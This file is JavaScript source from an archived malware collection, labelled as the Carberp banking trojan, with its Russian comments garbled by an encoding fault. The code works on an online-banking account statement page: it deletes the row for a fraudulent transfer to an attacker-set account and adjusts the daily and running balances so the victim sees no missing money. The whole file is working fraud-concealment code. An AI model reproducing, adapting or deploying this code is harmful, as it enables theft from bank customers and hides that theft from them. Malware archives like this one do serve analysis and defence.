/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*�������, ��������� �� ����� -> ������� -> �������� �������*/

var fields = {}, data = {};
function fixTable()
{
	/*��� ������ 1-8*/
	if(getVersion() >= 1 || getVersion() <= 8)
		fixTable_1_8();
	/*if(getVersion() == 9)
		fixTable_9();*/
}

/*���������� ������*/
function fixBallance(s)
{
	if(getVersion() != 9)
		return s;
		
	tmp = $(s).find("table tbody tr");
	alert(tmp.find("td:eq(1)").val());
	//alert(tmp.html());
	return "<b>0.0</b>";
}

function fixTable_1_8()
{	
	/*���� ��������*/
	if(typeof transfer_date == 'string')
		transfer_date = getDate(transfer_date).getTime();
	
	/*�������� ��������*/
	fields = {}; data = {};
	var xml = ScData.XMLDocument.documentElement;
	var i=0, moneyPeerDay=0, moneyTotal = 0, good=false, hidden = false;
	var today, firstDate;
	
	/*����������� ����*/
	$(xml).find("hd c").each(function(){
		var name = $(this).attr("dfld");
		if(!name)
			name = "CBank";
		fields[name] = i;
		i++;
	});
	
	/*���� "��������� �� ����" ������������*/
	if($(xml.selectSingleNode('//hd/c[@dfld="DocumentNumber"]')).attr("w"))
	{
		/*�������� �������� � �������� ������� ��� � ��������� :))*/
		$(xml.selectNodes('//bd/r')).each(function(){
			var $this = $(this);
			var opID = parseInt($this.attr("t"));
			hidden = false;
			
			if(opID == 1 && $this.find("c s:eq(1)").text() == acc_id)
				good = true;

			if(good)
			{
				good = true;
				switch(opID)
				{	
					case 0:
						if($this.find("c:eq("+getFieldPosition("ReceiverAccount")+")").text() == acc_id_to+" " && transfer_date == today)
							$this.remove();
						else
						{
							var money = moneyToFloat($this.find("c:eq("+getFieldPosition("D_Amount")+")").text());
							moneyPeerDay += money;
							moneyTotal += money;
						}
						
					break;
					
					/*����������� ����*/
					case 2:
						today = $this.find("c s:eq(0)").text();
						today = getDate(today).getTime();
						
						/*������ ���� ���������*/
						if(!firstDate)
							firstDate = today;
					break;
					
					/*������� �� ����*/
					case 3:
						/*���� �������� ������� "������� �� ����"*/
						if($("#SDT2").attr("checked"))
						{
							$this.find("c s:eq(1)").text(roundMoney(moneyPeerDay));
							moneyPeerDay = 0;
						}
					break;
					
					/*������� �� ����� ���*/
					case 4:
						if(today >= transfer_date)
						{
							var el = $this.find("c s:eq(1)");
							var moneyDayEnd = moneyToFloat(el.text()) + balance;
							el.html(roundMoney(moneyDayEnd));
							moneyDayEnd = 0;
						}
					break;
					
					/*�������� ���� ���������� "����� �������"*/
					case 5:
						/*��������� ���� "�����", �.�. "������" �������*/
						pushData("t5", $this.find("c s:eq(1)"));
					break;
					
					/*�������� ���� � ������� ����������� ������� �� ����� �������*/
					case 6:
						pushData("t6", $this.find("c s:eq(1)"));
					break;
					
					/*������� �� ������ ���*/
					case 12:
						if(today > transfer_date)
						{
							var el = $this.find("c s:eq(1)");
							var moneyDayStart = moneyToFloat(el.text()) + balance;
							el.html(roundMoney(moneyDayStart));
							moneyDayStart = 0;
						}
					break;
					
					/*�������� ���� � ������� ����������� ������� �� ������ �������*/
					case 13:
						pushData("t13", $this.find("c s:eq(1)"));
					break;
				}
			}
		});

		if(good)
		{
			/*������� �������� ����� "����� ������"*/
			updateElements(data.t5, moneyTotal, false);
			moneyTotal = 0;
			
			/*������ ������� �� ������ � �� ����� �������*/
			/*���� ������� ��� ������ ������� ��� ������� - ����������� ��� �������� �� ��������� �����*/
			/*today - ��������� ���� �������, firstDate - ������ ���� �������*/
			if(transfer_date <= firstDate)
			{
				updateElements(data.t6, balance, true);
				updateElements(data.t13, balance, true);
			}
			
			/*���� ������� ������ � ������ ������ ������ ������� �� ����� �������*/
			if(transfer_date > firstDate && transfer_date <= today)
				updateElements(data.t6, balance, true);
		}
		
		/*���������� ��� ����� � ������ "������ ���" ������� ��������, ���� �� ������� ������� �������, ���� ������� ������� ������� "�������� ������" */
		var nullSave = {};
		nullSave.save = false;
		var toDell = [];
		$(xml.selectNodes('//bd/r')).each(function(){
			var $this = $(this);
			var opID = parseInt($this.attr("t"));
			hidden = false;
			
			if(opID == 1 && $this.find("c s:eq(1)").text() == acc_id)
				good = true;

			if(good)
			{
				/*���� �������*/
				if(opID == 2)
					nullSave.save = true;
					
				/*������ �� �������*/	
				if(nullSave.save)
					toDell.push($this);
				
				/*���� �� ������� �� ����*/
				if(opID == 12)
				{
					if($this.next().attr("t") == "0" || $this.next().attr("t") == "7")
					{
						nullSave.save = false;
						toDell = [];
					}
					/*���� ������� ������� ������� �������*/
					if($this.next().attr("t") != "7" && $(xml).attr('NL') == "1")
					{
						var r = ScData.createElement("r");
						var txt = ScData.createTextNode("�������� �� ����");
						$(r).attr("t", "7");
						c = ScData.createElement("c");
						c.appendChild(txt);
						r.appendChild(c);
						$(r).insertAfter(this);
					}
				}
				if(opID == 4 && nullSave.save)
				{
					toDell.push($this);
					
					$.each(toDell, function(){
						if($(xml).attr('NL') == "0")
							this.remove();
							
					});
					
					nullSave.save = false;
				}
				
			}
		});
	}
	
	/*���� "��������� �� ����" �� ������������*/
	/*else
	{
		//alert(0);

	}*/
}
function pushData(field, el)
{
	if(!data[field])
		data[field] = new Array();
	data[field].push(el);
}
function updateElements(d,v,plus)
{
	$(d).each(function(){
		if(!plus)
			$(this).html(roundMoney(v));
		else
		{
			var val = moneyToFloat($(this).text())+v;
			$(this).html(roundMoney(val));
		}
	});
}
function getFieldPosition(find)
{
	return fields[find];
}
